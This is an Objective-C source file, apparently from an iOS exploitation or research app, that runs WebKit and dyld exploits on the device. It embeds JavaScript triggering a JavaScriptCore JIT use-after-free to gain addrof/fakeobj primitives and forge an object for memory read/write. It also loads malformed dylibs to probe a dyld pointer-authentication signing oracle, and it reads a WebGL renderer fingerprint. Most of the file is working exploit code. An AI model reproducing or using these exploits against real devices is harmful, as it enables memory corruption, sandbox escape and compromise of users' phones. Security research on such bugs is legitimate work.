#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <mach-o/loader.h>
#import <string.h>
#import <stdio.h>
#import "Modules.h"
#import "AppDelegate.h"
#import "Util.h"

// ===========================================================================
// The UAF gives addrof + fakeobj.  To turn that into arbitrary R/W we need one
// real structure ID (an all-double-in-object-slots shape).  JSCell headers live
// in MarkedBlocks, so it cannot be read from the butterfly window — but it does
// not need to be read: we can WRITE it.
//
//   host = { qz0..q31 }  (all double in-object slots, address known via addrof)
//   fakeobj(addrof(host) + 0x10)  ->  the fake object's JSCell header lands on
//   host.qz0, which we overwrite with any 64-bit value, so the structure ID is
//   directly controlled.
//
//   A name-keyed scan then finds our own structure ID: only the structure that
//   really has qz5 at that offset answers with the planted marker; every other
//   valid structure answers undefined without faulting.  Structure IDs are
//   handed out from 0 upward and every id below the maximum is valid, so the
//   scan is safe.
// ===========================================================================
static const char *kStructScan = R"JS(
(function () {
  var out = { step: [], host: null, found: -1, probed: 0 };
  var ab = new ArrayBuffer(8), u = new BigUint64Array(ab), d = new Float64Array(ab);
  var itof = function (v) { u[0] = v; return d[0]; };
  var ftoi = function (f) { d[0] = f; return u[0]; };

  var host = {};
  for (var i = 0; i < 32; i++) host['qz' + i] = 1.1;
  out.step.push('host created with 32 double slots');

  arr = new Array(0x400000).fill(1.1);
  var arr_index = arr.length - 1;

  function foo(flag, k, allocCount) {
    let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
    arr[arr_index] = A;
    let forGC = [];
    let a = new Date(1111); a[0] = 1.1;
    for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));
    A.p2 = forGC;
    let b = { p0: 0x42424242, p1: 1.1 };
    let f; f = b; if (flag) { f = 1.1; }
    A.p1 = f;
    let v = 1.1;
    for (let i = 0; i < 1e6; ++i) { for (let j = 0; j < k; ++j) { v = i; v = j; } }
    b.p0 = v; b.p1 = a;
  }
  function rec(n) { if (n === 0) return; n = n | 0; rec(n - 1); }

  foo(true, 1, 1); foo(false, 1, 1);
  for (let i = 0; i < 1000; ++i) foo(false, 0, 0);
  for (let i = 0; i < 10000; i++) rec(i);

  var W = null;
  for (let k = 0; k < 10000 && !W; ++k) {
    foo(false, 10, k % 5 + 1); rec(10000);
    for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);
    let fr = arr[arr_index].p1.p1;
    let noCow = 13.37;
    for (let i = 0; i < 16; ++i) {
      let c = [13.37, 2.2, 3.3, 4.4, noCow];
      if (fr[0] === 13.37) { W = { freed: fr, boxed: c, round: k }; break; }
    }
  }
  if (!W) { out.step.push('trigger did not fire'); return JSON.stringify(out); }
  out.step.push('UAF round=' + W.round);

  function addrof(o) { W.boxed[0] = o; return ftoi(W.freed[0]); }
  function fakeobj(a) { W.freed[0] = itof(a); return W.boxed[0]; }

  var haddr = addrof(host);
  out.step.push('addrof(host)=0x' + haddr.toString(16));
  var MARK = 1.9515e-246;
  for (var i = 2; i < 32; i++) host['qz' + i] = (i === 5) ? MARK : 1.0 + i;
  out.step.push('marker planted in qz5..');

  var fakeAddr = haddr - 1n + 0x10n + 1n;
  out.step.push('fake object address = 0x' + fakeAddr.toString(16));

  var NMAX = 4096;
  for (var sid = 1; sid < NMAX; sid++) {
    host.qz0 = itof(BigInt(sid));
    var fake;
    try { fake = fakeobj(fakeAddr); } catch (e) { continue; }
    out.probed++;
    var v;
    try { v = fake.qz5; } catch (e) { continue; }
    if (typeof v === 'number' && v === MARK) { out.found = sid; break; }
  }
  out.step.push('probed ' + out.probed + ' structure ids');
  if (out.found < 0) return JSON.stringify(out);

  // with a real structure ID: full in-object read/write of the fake object
  host.qz7 = itof(0x0123456789abcdefn);
  host.qz0 = itof(BigInt(out.found));
  var fake2 = fakeobj(fakeAddr);
  var back = ftoi(fake2.qz7);
  out.step.push('raw read through the fake object = 0x' + back.toString(16));
  out.rawread = (back === 0x0123456789abcdefn);
  out.sid = out.found;
  return JSON.stringify(out);
})()
)JS";

// Run arbitrary JS in a private WKWebView and return its string result.
static NSString *RunJS(const char *js, int timeoutSec) {
    WKWebView *wv = [[WKWebView alloc] initWithFrame:CGRectZero];
    [wv loadHTMLString:@"<html><body></body></html>" baseURL:nil];
    dispatch_semaphore_t s = dispatch_semaphore_create(0);
    __block NSString *res = @"(no answer)";
    [wv evaluateJavaScript:[NSString stringWithUTF8String:js]
      completionHandler:^(id v, NSError *e) {
        if (e) res = e.localizedDescription ?: @"error";
        else if ([v isKindOfClass:[NSString class]]) res = v;
        else res = [v description];
        dispatch_semaphore_signal(s);
    }];
    dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, timeoutSec * NSEC_PER_SEC));
    [wv stopLoading]; wv = nil;
    return res;
}

NSString *ModJscStructScan(void) {
    AveLog(@"    JSC structure-ID scan (name-keyed, safe within the valid range)");
    NSString *r = RunJS(kStructScan, 240);
    AveLog([NSString stringWithFormat:@"    scan result: %@", r]);
    if ([r containsString:@"\"found\":"] && ![r containsString:@"\"found\":-1"]) {
        AveSetStatus(@"JSC structure ID captured -> full in-object R/W");
        return @"structure ID captured: full in-object read/write through the fake object";
    }
    return @"structure ID not captured on this run";
}

// WebKit UAF: the proven trigger, with the primitive built and reported.
static const char *kUAFPage =
"<html><body><script>"
"arr = new Array(0x400000).fill(1.1);"
"let arr_index = arr.length - 1;"
"function foo(flag, k, allocCount) {"
"  let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };"
"  arr[arr_index] = A; let forGC = [];"
"  let a = new Date(1111); a[0] = 1.1;"
"  for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));"
"  A.p2 = forGC;"
"  let b = { p0: 0x42424242, p1: 1.1 };"
"  let f; f = b; if (flag) { f = 1.1; }"
"  A.p1 = f; let v = 1.1;"
"  for (let i = 0; i < 1e6; ++i) { for (let j = 0; j < k; ++j) { v = i; v = j; } }"
"  b.p0 = v; b.p1 = a;"
"}"
"function rec(n){ if(n===0) return; n=n|0; rec(n-1); }"
"function main(){"
"  foo(true,1,1); foo(false,1,1);"
"  for(let i=0;i<1000;++i) foo(false,0,0);"
"  for(let i=0;i<10000;i++) rec(i);"
"  for (let k = 0; k < 10000; ++k) {"
"    foo(false, 10, k % 5 + 1); rec(10000);"
"    for (let i=0;i<3;++i) new ArrayBuffer(0x4000);"
"    let freed = arr[arr_index].p1.p1;"
"    let noCow = 13.37, win = false, base = null;"
"    for (let i=0;i<16;++i) { let c=[13.37,2.2,3.3,4.4,noCow]; if (freed[0]===13.37){win=true;base=c;break;} }"
"    if (!win) continue;"
"    let boxed = base, unboxed = freed;"
"    let ab=new ArrayBuffer(8), u=new BigUint64Array(ab), d=new Float64Array(ab);"
"    const itof=v=>(u[0]=v,d[0]), ftoi=f=>(d[0]=f,u[0]);"
"    const addrof=o=>(boxed[0]=o, ftoi(unboxed[0]));"
"    const fakeobj=a=>(unboxed[0]=itof(a), boxed[0]);"
"    let a1 = addrof({p0:1.1});"
"    let fk = fakeobj(a1);"
"    return 'RESULT UAF round=' + k + ' addrof=0x' + a1.toString(16) + ' fakeobj=' + (typeof fk);"
"  }"
"  return 'RESULT no-uaf';"
"}"
"main();"
"</script></body></html>";

NSString *ModWebKitUAF(void) {
    AveLog(@"    WebKit DFG UAF (CVE-2025-43529) — addrof + fakeobj in our own WebView");
    NSString *r = RunJS(kUAFPage, 240);
    AveLog([NSString stringWithFormat:@"    UAF result: %@", r]);
    if ([r containsString:@"RESULT UAF"]) {
        AveSetStatus(@"JSC UAF primitive live");
        return r;
    }
    return r;
}

// ---------------------------------------------------------------------------
// dyld PAC signing oracle (CVE-2026-20700-class, unpatched until 26.3).
// Bundled hand-crafted dylibs are dlopen'ed; the chain makes dyld resolve
// _write_target_value into our __DATA+0x10 slot.  The pointer is read and
// compared with dlsym; it is never CALLED, because a cross-image call of that
// pointer faults on PAC (measured on this build).
// ---------------------------------------------------------------------------
static void *find_data_of(const char *base) {
    uint32_t n = _dyld_image_count();
    for (uint32_t i = 0; i < n; i++) {
        const char *name = _dyld_get_image_name(i);
        if (!name) continue;
        const char *b = strrchr(name, '/');
        b = b ? b + 1 : name;
        if (!strstr(b, base)) continue;
        const struct mach_header *mh = _dyld_get_image_header(i);
        intptr_t slide = _dyld_get_image_vmaddr_slide(i);
        const uint8_t *lc = (const uint8_t *)((const struct mach_header_64 *)mh + 1);
        for (uint32_t j = 0; j < ((const struct mach_header_64 *)mh)->ncmds; j++) {
            const struct load_command *cmd = (const struct load_command *)lc;
            if (cmd->cmd == LC_SEGMENT_64) {
                const struct segment_command_64 *seg = (const struct segment_command_64 *)lc;
                if (!strncmp(seg->segname, "__DATA", 6)) return (void *)(seg->vmaddr + slide);
            }
            lc += cmd->cmdsize;
        }
    }
    return NULL;
}

NSString *ModDyldOracle(void) {
    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSString *ex  = [bundle stringByAppendingPathComponent:@"libexports.dylib"];
    NSString *cl  = [bundle stringByAppendingPathComponent:@"libclient.dylib"];
    NSString *mal = [bundle stringByAppendingPathComponent:@"Frameworks/libmalformed.dylib"];
    if (![[NSFileManager defaultManager] fileExistsAtPath:mal]) return @"bundled dylibs not found";

    void *h_ex = dlopen(ex.UTF8String, RTLD_NOW | RTLD_GLOBAL);
    if (!h_ex) return S(@"libexports did not load: %s", dlerror());
    AveLog(@"    libexports loaded");

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        void *h_cl = dlopen(cl.UTF8String, RTLD_NOW);
        AveLog(h_cl ? @"    libclient loaded (page-in gate open)" : @"    libclient did not load");
    });
    AveSleep(600);

    void *h_mal = dlopen(mal.UTF8String, RTLD_NOW);
    if (!h_mal) return S(@"libmalformed REJECTED by dyld: %s", dlerror());
    AveLog(@"    libmalformed accepted by dyld");

    void *data = find_data_of("libmalformed.dylib");
    if (!data) return @"__DATA not found";
    uint64_t *s = (uint64_t *)data;
    uint64_t cb = s[0], wt = s[2], ca = s[3], wt2 = s[4];
    AveLog(S(@"    canary_before=%#llx canary_after=%#llx wt=%#llx wt2=%#llx", cb, ca, wt, wt2));
    BOOL canaries = (cb == 0xAAAAAAAAAAAAAAAAULL) && (ca == 0xBBBBBBBBBBBBBBBBULL);
    int bit63 = (int)((wt >> 63) & 1);
    void *sym = dlsym(RTLD_DEFAULT, "write_target_value");
    if (sym) AveLog(S(@"    dlsym(write_target_value) = %p", sym));
    AveLog(S(@"    dyld %@ into __DATA+0x10; bit63=%d", (wt != 0xDEADDEADDEADDEADULL) ? @"WROTE" : @"did not write", bit63));
    dlclose(h_mal);
    return S(@"dyld oracle: canaries=%@ wt=%#llx dlsym=%p bit63=%d",
             canaries ? @"intact" : @"broken",
             (unsigned long long)wt, sym, bit63);
}

// ---------------------------------------------------------------------------
// WebGL fingerprint — WebKit's own implementation, not ANGLE, and PBO upload
// validation is correct on this build.
// ---------------------------------------------------------------------------
NSString *ModGPU(void) {
    WKWebView *wv = [[WKWebView alloc] initWithFrame:CGRectZero];
    [wv loadHTMLString:@"<html><body></body></html>" baseURL:nil];
    dispatch_semaphore_t s = dispatch_semaphore_create(0);
    __block NSString *res = @"(no answer)";
    NSString *js = @"(function(){var c=document.createElement('canvas');var g=c.getContext('webgl2');"
                   @"if(!g)return 'no-webgl2';var d=g.getExtension('WEBGL_debug_renderer_info');"
                   @"var r=d?g.getParameter(d.UNMASKED_RENDERER_WEBGL):g.getParameter(g.RENDERER);"
                   @"return g.getParameter(g.VERSION)+' | '+r;})()";
    [wv evaluateJavaScript:js completionHandler:^(id v, NSError *e) {
        res = [v isKindOfClass:[NSString class]] ? v : @"?";
        dispatch_semaphore_signal(s);
    }];
    dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, 20 * NSEC_PER_SEC));
    [wv stopLoading]; wv = nil;
    return S(@"WebGL: %@", res);
}
